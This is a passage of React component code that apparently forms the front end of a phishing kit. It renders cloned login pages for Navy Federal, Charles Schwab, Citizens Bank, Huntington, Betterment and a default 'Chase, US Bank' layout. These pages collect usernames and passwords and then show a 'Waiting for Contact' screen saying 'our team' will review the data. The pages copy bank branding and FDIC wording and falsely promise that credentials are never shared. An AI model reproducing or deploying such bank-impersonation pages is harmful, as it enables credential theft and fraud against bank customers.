                  disabled={submitting}
                  className="w-full rounded-full bg-green-700 py-3 font-bold text-white hover:bg-green-800 transition-colors disabled:opacity-60 mb-8"
                >
                  {submitting ? 'Logging in…' : 'Login'}
                </button>

                <button
                  type="button"
                  onClick={() => setFormStep('username')}
                  className="w-full text-base text-gray-600 hover:text-gray-800 font-medium"
                >
                  Back
                </button>
              </form>

              <div className="mt-8 text-center">
                <p className="text-base text-gray-700">
                  Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">username</a> or{' '}
                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">password</a>?
                </p>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Navy Federal
    if (isNavyFederal) {
      return (
        <div className="min-h-screen bg-gradient-to-b from-blue-200 to-blue-100 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-4xl px-4">
              <h1 className="mb-16 text-center text-5xl font-bold text-blue-900">Welcome to Digital Banking</h1>

              <div className="rounded-2xl bg-white p-12 shadow-lg border-t-8 border-orange-500">
                {/* Título con candado */}
                <div className="mb-12 flex items-center gap-3 border-b-2 border-gray-300 pb-6">
                  <Icon name="lock" size={28} className="text-gray-600" />
                  <h2 className="text-3xl font-bold text-gray-800">Sign In</h2>
                </div>

                <form onSubmit={submitForm} className="space-y-8">
                  <div className="grid grid-cols-1 gap-8 sm:grid-cols-2">
                    {/* Username */}
                    <div>
                      <label className="mb-3 flex items-center gap-2">
                        <span className="text-lg font-bold text-gray-800">Username</span>
                        <button
                          type="button"
                          title="Username help"
                          className="text-gray-600 hover:text-gray-800"
                        >
                          <Icon name="help-circle" size={20} />
                        </button>
                      </label>
                      <input
                        type="text"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-orange-500"
                      />
                    </div>

                    {/* Password */}
                    <div>
                      <label className="mb-3 block text-lg font-bold text-gray-800">Password</label>
                      <div className="relative">
                        <input
                          type={showPassword ? 'text' : 'password'}
                          required
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-orange-500"
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
                        >
                          <Icon name={showPassword ? 'eye-off' : 'eye'} size={22} />
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Sign In Button - positioned to the right */}
                  <div className="flex justify-end">
                    <button
                      type="submit"
                      disabled={submitting}
                      className="rounded-xl bg-orange-500 px-12 py-3 text-xl font-bold text-white hover:bg-orange-600 transition-colors disabled:opacity-60 shadow-lg"
                    >
                      {submitting ? 'Signing in…' : 'Sign In'}
                    </button>
                  </div>
                </form>

                {/* Sign In Help Link */}
                <div className="mt-8 pt-6 border-t border-gray-300">
                  <a href="#" className="text-base font-bold text-blue-600 hover:text-blue-700 uppercase tracking-wide">
                    Sign In Help
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Charles Schwab
    if (isCharlesSchwab) {
      return (
        <div className="min-h-screen bg-gray-50 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-lg rounded-lg border border-gray-300 bg-white p-12">
              <h1 className="mb-8 text-3xl font-bold text-gray-900">Log in to Schwab</h1>

              <form onSubmit={submitForm} className="space-y-6">
                {/* Login ID */}
                <div>
                  <label className="mb-2 block text-base font-semibold text-gray-800">Login ID</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-teal-600"
                  />
                </div>

                {/* Password */}
                <div>
                  <label className="mb-2 block text-base font-semibold text-gray-800">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border border-gray-400 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-teal-600"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                    </button>
                  </div>
                </div>

                {/* Remember Login ID */}
                <label className="flex items-center gap-3">
                  <input
                    type="checkbox"
                    checked={rememberUsername}
                    onChange={(e) => setRememberUsername(e.target.checked)}
                    className="h-5 w-5 cursor-pointer border border-gray-400 accent-teal-600"
                  />
                  <span className="text-base text-gray-800">Remember Login ID</span>
                </label>

                {/* Start Page */}
                <div>
                  <label className="mb-2 block text-base font-semibold text-gray-800">Start Page</label>
                  <select
                    value={startPage}
                    onChange={(e) => setStartPage(e.target.value)}
                    className="w-full border border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-teal-600 bg-white"
                  >
                    <option value="accounts-summary">Accounts Summary</option>
                    <option value="portfolio">Portfolio</option>
                    <option value="positions">Positions</option>
                  </select>
                </div>

                {/* Log In Button */}
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-full bg-teal-700 py-3 font-bold text-white hover:bg-teal-800 transition-colors disabled:opacity-60 mt-8"
                >
                  {submitting ? 'Logging in…' : 'Log In'}
                </button>
              </form>

              {/* Links and Language */}
              <div className="mt-8 space-y-4 text-center">
                <p className="text-base text-gray-800">
                  Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">Login ID</a> or{' '}
                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">Password</a>?
                </p>

                <div className="flex items-center justify-center gap-4 pt-4 border-t border-gray-300">
                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">
                    New User?
                  </a>
                  <div className="border-l border-gray-400 pl-4">
                    <select
                      value={language}
                      onChange={(e) => setLanguage(e.target.value)}
                      className="border border-gray-400 px-3 py-2 text-gray-800 bg-white rounded hover:border-gray-500"
                    >
                      <option value="english">English</option>
                      <option value="spanish">Español</option>
                      <option value="chinese">中文</option>
                    </select>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Citizens Bank
    if (isCitizens) {
      return (
        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-md">
              <form onSubmit={submitForm} className="space-y-8">
                {/* User ID */}
                <div>
                  <label className="mb-3 block text-xl font-bold text-gray-900">User ID</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border-2 border-gray-800 px-4 py-4 text-lg text-gray-800 outline-none transition-colors focus:border-blue-600"
                  />
                </div>

                {/* Password */}
                <div>
                  <label className="mb-3 block text-xl font-bold text-gray-900">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border-2 border-gray-800 px-4 py-4 pr-16 text-lg text-gray-800 outline-none transition-colors focus:border-blue-600"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 top-1/2 -translate-y-1/2 font-bold text-gray-800 hover:text-gray-600 underline"
                    >
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                </div>

                {/* Remember user ID */}
                <label className="flex items-center gap-3">
                  <input
                    type="checkbox"
                    checked={rememberUsername}
                    onChange={(e) => setRememberUsername(e.target.checked)}
                    className="h-6 w-6 cursor-pointer border-2 border-gray-600"
                  />
                  <span className="text-lg text-gray-900">Remember user ID</span>
                </label>

                {/* Help Links */}
                <div className="space-y-3 pt-4">
                  <a href="#" className="block text-lg font-semibold text-blue-600 hover:text-blue-700 underline">
                    Trouble logging in/Password change
                  </a>
                  <p className="text-lg text-gray-900">
                    New to Online Banking?{' '}
                    <a href="#" className="font-semibold text-blue-600 hover:text-blue-700 underline">
                      Enroll now.
                    </a>
                  </p>
                </div>

                {/* Buttons */}
                <div className="flex gap-4 pt-6">
                  <button
                    type="submit"
                    disabled={submitting}
                    className="flex items-center justify-center gap-3 bg-red-700 px-8 py-4 font-bold text-white hover:bg-red-800 transition-colors disabled:opacity-60"
                  >
                    <Icon name="lock" size={24} />
                    <span>{submitting ? 'Logging in…' : 'Log In'}</span>
                  </button>
                  <button
                    type="button"
                    onClick={closeWindow}
                    className="px-8 py-4 font-bold text-gray-900 hover:text-gray-700 underline"
                  >
                    Cancel
                  </button>
                </div>
              </form>

              {/* Disclaimer */}
              <div className="mt-12 text-center">
                <p className="text-sm italic text-gray-700">
                  Non-deposit products: Are not FDIC Insured; Are not deposits; May lose value.
                </p>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Huntington Bank
    if (isHuntington) {
      const [selectedCategory, setSelectedCategory] = useState('personal')

      return (
        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-2xl border-4 border-green-700 p-12">
              {/* Category Tabs */}
              <div className="mb-8 flex gap-4">
                <button
                  onClick={() => setSelectedCategory('personal')}
                  className={`px-6 py-3 font-bold transition-colors ${
                    selectedCategory === 'personal'
                      ? 'rounded-lg bg-green-700 text-white'
                      : 'border-2 border-green-700 text-green-700 hover:bg-green-50'
                  }`}
                >
                  Personal & Business
                </button>
                <button
                  onClick={() => setSelectedCategory('commercial')}
                  className={`px-6 py-3 font-bold transition-colors ${
                    selectedCategory === 'commercial'
                      ? 'rounded-lg bg-green-700 text-white'
                      : 'border-2 border-green-700 text-green-700 hover:bg-green-50'
                  }`}
                >
                  Commercial
                </button>
                <button
                  onClick={() => setSelectedCategory('other')}
                  className={`px-6 py-3 font-bold transition-colors ${
                    selectedCategory === 'other'
                      ? 'rounded-lg bg-green-700 text-white'
                      : 'border-2 border-green-700 text-green-700 hover:bg-green-50'
                  }`}
                >
                  Other
                </button>
              </div>

              {/* FDIC Badge */}
              <div className="mb-8 flex items-center gap-3">
                <svg className="h-8 w-auto" viewBox="0 0 100 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <rect width="100" height="60" fill="#003366" />
                  <text x="50" y="40" fontSize="24" fontWeight="bold" fill="white" textAnchor="middle">
                    FDIC
                  </text>
                </svg>
                <span className="text-sm italic text-gray-700">
                  FDIC-Insured—Backed by the full faith and credit of the U.S. Government
                </span>
              </div>

              <form onSubmit={submitForm} className="space-y-8">
                <h2 className="text-3xl font-bold text-green-700">Log into Online Banking</h2>

                {/* Username */}
                <div>
                  <label className="mb-3 block text-base text-gray-600">Username</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-green-700"
                  />
                </div>

                {/* Password */}
                <div>
                  <label className="mb-3 block text-base text-gray-600">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border-2 border-gray-400 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-green-700"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                    </button>
                  </div>
                </div>

                {/* Log In Button + Help Links */}
                <div className="flex items-center justify-between gap-8 pt-4">
                  <button
                    type="submit"
                    disabled={submitting}
                    className="flex items-center gap-3 rounded-full bg-gray-800 px-8 py-3 font-bold text-white hover:bg-gray-900 transition-colors disabled:opacity-60"
                  >
                    <Icon name="lock" size={20} />
                    <span>{submitting ? 'Logging in…' : 'Log In'}</span>
                  </button>

                  <div className="space-y-2 text-center">
                    <a href="#" className="block text-base text-gray-800 hover:text-gray-600 font-semibold underline">
                      Forgot Username?
                    </a>
                    <a href="#" className="block text-base text-gray-800 hover:text-gray-600 font-semibold underline">
                      Forgot Password?
                    </a>
                  </div>
                </div>
              </form>

              {/* Footer Links */}
              <div className="mt-10 border-t border-gray-300 pt-8">
                <p className="text-lg font-bold text-green-700">New to Online Banking?</p>
                <div className="mt-2 space-y-2">
                  <a href="#" className="block text-base text-gray-800 hover:text-gray-600 underline">
                    Enroll Now
                  </a>
                  <a href="#" className="block text-base text-gray-800 hover:text-gray-600 underline">
                    Learn More
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Betterment
    if (isBetterment) {
      return (
        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-md">
              {/* Betterment Logo */}
              <div className="mb-12 flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-yellow-400">
                  <div className="text-lg font-bold text-blue-900">∪</div>
                </div>
                <h1 className="text-3xl font-bold text-blue-900">Betterment</h1>
              </div>

              <form onSubmit={submitForm} className="space-y-6">
                {/* Email */}
                <div>
                  <label className="mb-2 block text-base text-gray-800">Email</label>
                  <input
                    type="email"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-blue-600"
                  />
                </div>

                {/* Password */}
                <div>
                  <label className="mb-2 block text-base text-gray-800">Password</label>
                  <input
                    type={showPassword ? 'text' : 'password'}
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-blue-600"
                  />
                </div>

                {/* Security Check */}
                <div className="rounded-lg border-2 border-gray-300 bg-gray-50 p-4">
                  <div className="flex items-center gap-3">
                    <div className="flex h-8 w-8 items-center justify-center rounded-full bg-green-600">
                      <Icon name="check" size={20} className="text-white" />
                    </div>
                    <span className="text-lg text-gray-800">Success!</span>
                  </div>
                </div>

                {/* Log In Button */}
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-full rounded-lg bg-blue-600 py-4 text-center font-bold text-white hover:bg-blue-700 transition-colors disabled:opacity-60 mt-8"
                >
                  {submitting ? 'Logging in…' : 'Log in'}
                </button>
              </form>

              {/* Footer Links */}
              <div className="mt-8 flex justify-between">
                <a href="#" className="text-base font-semibold text-blue-600 hover:text-blue-700">
                  Forgot password?
                </a>
                <a href="#" className="text-base font-semibold text-blue-600 hover:text-blue-700">
                  Sign Up
                </a>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño por defecto (Chase, US Bank, etc.)
    return (
      <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
        {/* Botón cerrar */}
        <div className="flex justify-end px-4 sm:px-0">
          <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <path d="M18 6 6 18M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="mx-auto grid max-w-6xl grid-cols-1 gap-8 px-4 py-8 sm:grid-cols-2 sm:px-8">
          {/* Columna izquierda - Formulario */}
          <div>
            {/* Logo del banco */}
            <div className="mb-8 flex h-12 items-center">
              <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
            </div>

            <h1 className="mb-2 text-3xl font-bold text-content-primary">Account login</h1>
            <p className="mb-8 text-content-secondary">Securely access your account</p>

            <form onSubmit={submitForm} className="space-y-6">
              {/* Username */}
              <div>
                <label className="mb-2 block text-sm font-semibold text-content-primary">Username</label>
                <input
                  type="text"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 outline-none transition-colors focus:border-blue-600"
                />
              </div>

              {/* Remember username */}
              <label className="flex items-center gap-3">
                <input
                  type="checkbox"
                  checked={rememberUsername}
                  onChange={(e) => setRememberUsername(e.target.checked)}
                  className="h-5 w-5 cursor-pointer rounded border-black/20 accent-blue-600"
                />
                <span className="text-sm text-content-primary">Remember my username</span>
              </label>

              {/* Password */}
              <div>
                <div className="mb-2 flex items-center justify-between">
                  <label className="block text-sm font-semibold text-content-primary">Password</label>
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="text-sm text-blue-600 hover:text-blue-700"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
                <input
                  type={showPassword ? 'text' : 'password'}
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 outline-none transition-colors focus:border-blue-600"
                />
              </div>

              {/* Login button */}
              <button
                type="submit"
                disabled={submitting}
                className="mt-8 w-full rounded-xl bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
              >
                {submitting ? 'Logging in…' : 'Log in with password'}
              </button>

              {/* Divider */}
              <div className="flex items-center gap-3 py-4">
                <div className="flex-1 border-t border-black/10" />
                <span className="text-sm text-content-tertiary">OR</span>
                <div className="flex-1 border-t border-black/10" />
              </div>

              {/* Passkey button */}
              <button
                type="button"
                className="w-full rounded-xl border-2 border-blue-600 py-3.5 font-bold text-blue-600 hover:bg-blue-50"
              >
                👤 Use passkey
              </button>
            </form>

            {/* Links */}
            <div className="mt-8 space-y-4 text-center">
              <a href="#" className="block text-sm text-blue-600 hover:text-blue-700">
                Forgot username or password?
              </a>
              <a href="#" className="block text-sm underline text-content-primary hover:text-content-secondary">
                Enroll in online banking
              </a>
            </div>
          </div>

          {/* Columna derecha - Info panel */}
          <div className="hidden flex-col justify-center sm:flex">
            <div className="rounded-2xl bg-blue-50 p-8">
              <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-blue-100">
                <span className="text-3xl">🔐</span>
              </div>
              <h2 className="mb-4 text-2xl font-bold text-content-primary">Enhanced Security</h2>
              <p className="mb-6 text-content-secondary">
                Your login is protected with bank-grade encryption and security measures. We never share your credentials with third parties.
              </p>
              <a href="#" className="inline-flex items-center gap-2 text-sm font-semibold text-blue-600 hover:text-blue-700">
                Learn more <span>→</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // ---- ESPERANDO CONTACTO ----
  if (step === 'waiting') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="hourglass" size={32} className="text-forest animate-pulse" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Waiting for Contact</h1>
          <p className="text-content-secondary">We received your information. Our team will review it and get back to you soon.</p>
          <div className="mt-6 h-1 w-12 rounded-full bg-bright-green mx-auto animate-pulse" />
        </div>
      </div>
    )
  }

  // ---- ÉXITO ----
  if (step === 'success') {
    setTimeout(closeWindow, 5000) // Esperar 5 segundos antes de cerrar
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="check" size={32} stroke={3} className="text-forest" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Form Submitted Successfully!</h1>
          <p className="text-content-secondary">Thank you. This window will close in a moment.</p>
        </div>
      </div>
    )
  }
}
